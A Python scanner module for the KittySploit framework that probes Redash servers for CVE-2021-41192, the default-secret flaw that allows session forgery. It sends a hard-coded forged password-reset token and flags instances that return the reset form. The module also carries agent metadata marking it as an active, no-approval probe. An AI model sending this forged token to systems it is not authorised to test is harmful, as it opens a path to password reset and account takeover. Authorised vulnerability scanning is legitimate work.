#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Redash Setup Configuration is vulnerable to default secrets disclosure (Insecure Default Initialization of Res."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Redash Setup Configuration - Default Secrets Disclosure Detection',
        'description': 'Redash Setup Configuration is vulnerable to default secrets disclosure (Insecure Default Initialization of Resource). If an admin sets up Redash versions <=10.0 and prior without explicitly specifying the `REDASH_COOKIE_SECRET` or `REDASH_SECRET_KEY` environment variables, a default value is used for both that is the same across all installations. In such cases, the instance is vulnerable to attackers being able to forge sessions using the known default value.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'hackerone', 'redash', 'auth-bypass', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://hackerone.com/reports/1380121',
            'https://github.com/getredash/redash/security/advisories/GHSA-g8xr-f424-h2rv',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-41192',
            'https://github.com/getredash/redash/commit/ce60d20c4e3d1537581f2f70f1308fe77ab6a214',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2021-41192',
    }

    def run(self):
        for path in ('/reset/IjEi.YhAmmQ.cdQp7CnnVq02aQ05y8tSBddl-qs', '/redash/reset/IjEi.YhAmmQ.cdQp7CnnVq02aQ05y8tSBddl-qs'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_all = ('Enter your new password:', 'redash',)
            if (all(m in body for m in body_all)):
                self.set_info(
                    severity='medium',
                    reason="Redash Setup Configuration - Default Secrets Disclosure detected",
                    path=path,
                )
                return True
        return False

